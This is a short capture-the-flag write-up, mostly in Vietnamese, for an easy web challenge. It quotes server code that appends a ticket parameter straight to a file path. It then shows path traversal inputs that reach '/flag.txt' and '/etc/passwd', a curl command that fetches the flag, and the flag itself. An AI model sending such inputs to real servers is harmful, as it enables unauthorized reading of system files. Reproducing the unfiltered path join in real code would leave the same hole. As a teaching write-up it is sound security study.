---
title: NNS Travel
date: 2026-09-27
ctf: NNS CTF
category: web
difficulty: easy
tags:
  - Path Traversal
---

## Đề bài

NNS Air has launched a brand new travel agency: NNS Air Travel Agency. Now you just need to find the tickets they ordered for you.

The flag is located at `/flag.txt`.

File: [web_nns-travel.tar.gz](https://github.com/Drakie14/Challenges/blob/NNS-CTF/web_nns-travel.tar.gz)

## Solution
Server chỉ có một route đáng chú ý là `POST /get-file` (`src/index.ts`):

```ts!
const ticket = url.searchParams.get('pnr');
const f = Bun.file('./tickets/' + ticket);   // (!) nối thẳng input vào path
return new Response(await f.text(), { headers: { 'Content-Type': 'application/json' } });
```

`pnr` được nối thẳng vào đường dẫn file mà **không lọc `../`** → **Path Traversal**. Ràng buộc 6 ký tự chỉ nằm ở client nên ta gọi thẳng API để bỏ qua.

WORKDIR container là `/app` (xem `Dockerfile`), nên `./tickets/` = `/app/tickets/`. Leo lên 2 cấp là tới `/`, mà đề cho biết flag ở `/flag.txt`:

| `pnr` | File thực mở |
|---|---|
| `../../flag.txt` | `/flag.txt` |
| `../../etc/passwd` | `/etc/passwd` (đối chứng) |

```bash!
curl -s -X POST "http://HOST:PORT/get-file?pnr=../../flag.txt"
```

->Flag: `NNS{WH0op5_You_found_4_p4th_7R4v3rs4l_in_My_cod3}`
